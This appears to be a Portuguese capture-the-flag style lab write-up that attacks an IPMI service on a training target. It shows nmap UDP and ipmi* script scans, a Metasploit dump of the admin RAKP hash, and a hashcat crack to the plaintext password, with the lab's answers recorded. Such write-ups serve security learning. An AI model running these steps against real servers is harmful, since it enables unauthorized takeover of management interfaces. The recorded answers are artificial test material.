## Alvo
- IP -> 10.129.179.202

## Objetivo
- Qual nome de usuário está configurado para acessar o host via IPMI? -> admin
- Qual é a senha de texto claro da conta? -> trinity

## Ferramentas e scripts utilizados
- nmap
- metasploit

## Resultados obtidos
```
sudo nmap -sU 10.129.179.202 -F
Not shown: 94 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
111/udp  open          rpcbind
137/udp  open          netbios-ns
138/udp  open|filtered netbios-dgm
623/udp  open          asf-rmcp
2049/udp open          nfs

Nmap done: 1 IP address (1 host up) scanned in 98.10 seconds
```
--- 
```
sudo nmap -sU -p 623 --script ipmi* 10.129.179.202
Nmap scan report for 10.129.179.202
Host is up (0.32s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-cipher-zero: 
|   VULNERABLE:
|   IPMI 2.0 RAKP Cipher Zero Authentication Bypass
|     State: VULNERABLE
|     Risk factor: High
|       
|       The issue is due to the vendor shipping their devices with the
|       cipher suite '0' (aka 'cipher zero') enabled. This allows a
|       remote attacker to authenticate to the IPMI interface using
|       an arbitrary password. The only information required is a valid
|       account, but most vendors ship with a default 'admin' account.
|       This would allow an attacker to have full control over the IPMI
|       functionality
|           
|     References:
|       https://www.us-cert.gov/ncas/alerts/TA13-207A
|_      http://fish2.com/ipmi/cipherzero.html
| ipmi-version: 
|   Version: 
|     IPMI-2.0
|   UserAuth: password, md5, md2, null
|   PassAuth: auth_msg, auth_user, non_null_user
|_  Level: 1.5, 2.0
| ipmi-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 10760 guesses in 601 seconds, average tps: 18.6

Nmap done: 1 IP address (1 host up) scanned in 603.83 seconds
```
---
```
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > run
/usr/share/metasploit-framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
/usr/share/metasploit-framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
/usr/share/metasploit-framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
/usr/share/metasploit-framework/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb:350: warning: Socket#sendto is deprecated; use send(mesg, flags, host, port) instead
[+] 10.129.179.202:623 - IPMI - Hash found: admin:49deab88020a15001a46442c5a8152f4de21039178a8d5857737cd2deb105eaf9691691b2a1853e9a123456789abcdefa123456789abcdef140561646d696e:796dc047763039bc7ae00e67051a51897b166f9d
```
```
hashcat -m 7300 -a 0 senha.txt /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (2068 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

49deab88020a15001a46442c5a8152f4de21039178a8d5857737cd2deb105eaf9691691b2a1853e9a123456789abcdefa123456789abcdef140561646d696e:796dc047763039bc7ae00e67051a51897b166f9d:trinity
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 7300 (IPMI2 RAKP HMAC-SHA1)
Hash.Target......: 49deab88020a15001a46442c5a8152f4de21039178a8d585773...166f9d
Time.Started.....: Fri Aug 28 10:06:04 2026 (0 secs)
Time.Estimated...: Fri Aug 28 10:06:04 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   141.2 kH/s (0.77ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> oooooo
Hardware.Mon.#01.: Util: 15%

Started: Fri Aug 28 10:05:46 2026
Stopped: Fri Aug 28 10:06:05 2026

```
## Considerações
Primeiramente foi feito uma digitalização do alvo com -sU pois o serviço alvo é o IPMI que utiliza a porta 623 UDP , nisso achei esses serviços rodando e o IPMI. Em seguida fiz --script ipmi* para testar todos os scripts na porta 623 e tentar obter algum resultado mas não foi possivel , assim fui para o metasploit e utilizei um módulo dele que faz dump de hashes e user , assim recuperei o usuário admin( Responde a primeira pergunta ) e a hash de senha dele . Assim fui pro hashcat com modo 7300 , usei a wordlist rockyou e crackeei a hash dele que retornou a senha trinity ( Responde a segunda pergunta ).

